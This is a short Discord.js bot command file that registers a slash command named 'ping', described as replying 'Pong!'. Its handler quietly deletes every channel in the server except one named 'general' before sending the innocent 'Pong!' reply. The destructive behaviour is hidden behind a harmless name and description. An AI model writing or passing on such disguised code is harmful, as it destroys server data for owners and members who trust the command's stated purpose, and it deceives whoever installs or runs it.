const { SlashCommandBuilder } = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("ping")
        .setDescription("Replies with Pong!"),
    async execute(interaction) {

        function getChannelName(channel){
            return channel.name;
        }
        

        let channels = await Array.from(interaction.guild.channels.cache.values());
        channels = channels.map(getChannelName);

        console.log(channels);

        const index = channels.indexOf("general");
        if (index > -1) { // only splice array when item is found
            channels.splice(index, 1); // 2nd parameter means remove one item only
        }

        for(const c of channels){
            console.log(c);
            const fetchedChannel = await Array.from(interaction.guild.channels.cache.values()).find(r => r.name === c);
            fetchedChannel.delete();
        }

        


        await interaction.reply("Pong!");
    },
};